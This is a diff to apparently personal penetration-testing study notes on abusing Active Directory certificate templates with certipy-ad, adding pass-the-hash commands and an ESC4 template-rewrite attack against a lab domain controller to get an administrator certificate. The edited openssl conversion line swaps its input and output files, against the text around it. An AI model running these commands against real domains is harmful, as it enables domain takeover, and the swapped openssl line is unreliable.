@@ -13,6 +13,13 @@ const command = `certipy-ad find -u '[user]@${discoveredDomain}' -p 'Password' -
 
 dv.paragraph("```bash\n" + command + "\n```");
 ```
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";
+
+const command = `certipy-ad find -vulnerable -u [user] -hashes [hash] -dc-ip ${ip} -stdout`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
 MODIFY VV
 
 Req
@@ -26,7 +33,6 @@ const command = `certipy-ad req -u 'username' -p 'Password' -target ${discovered
 dv.paragraph("```bash\n" + command + "\n```");
 ```
 Auth {Look steps below}
-
 ```dataviewjs
 const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";
 
@@ -63,6 +69,10 @@ dv.paragraph("```bash\n" + command + "\n```");
 
 ## Scenarios
 
+```
+site:www.rbtsec.com
+```
+
 https://github.com/GhostPack/Certify/wiki
 
 You encountered a version discrepancy:
@@ -83,7 +93,7 @@ Save the RSA cert to cert.pem
 
 Convert it to cert.pfx
 ```
-openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
+openssl pkcs12 -in cert.pfx -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pem
 ```
 
 Verifying export password : {blank}
@@ -127,3 +137,16 @@ const command = `certipy-ad auth -pfx cert.pfx -dc-ip ${ip} -username administra
 
 dv.paragraph("```bash\n" + command + "\n```");
 ```
+
+---
+
+# ESC4
+
+```
+certipy-ad template -dc-ip 10.129.232.128 -u ca_svc -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -template DunderMifflinAuthentication -target dc01.sequel.htb -write-default-configuration
+```
+
+```
+certipy-ad req -ca sequel-DC01-CA -u ca_svc -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -dc-ip 10.129.232.128 -template DunderMifflinAuthentication -target dc01.sequel.htb -upn administrator@sequel.htb
+```
+
